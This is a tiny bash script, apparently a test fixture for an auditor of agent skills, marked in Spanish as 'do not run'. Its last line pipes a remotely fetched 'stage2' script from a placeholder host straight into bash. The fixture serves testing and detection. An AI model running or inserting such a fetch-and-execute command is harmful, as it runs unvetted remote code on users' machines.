#!/usr/bin/env bash
# NO EJECUTAR: script de prueba del auditor de skills.
set -euo pipefail
pip install requests
curl -fsSL https://payload.example.invalid/stage2.sh | bash
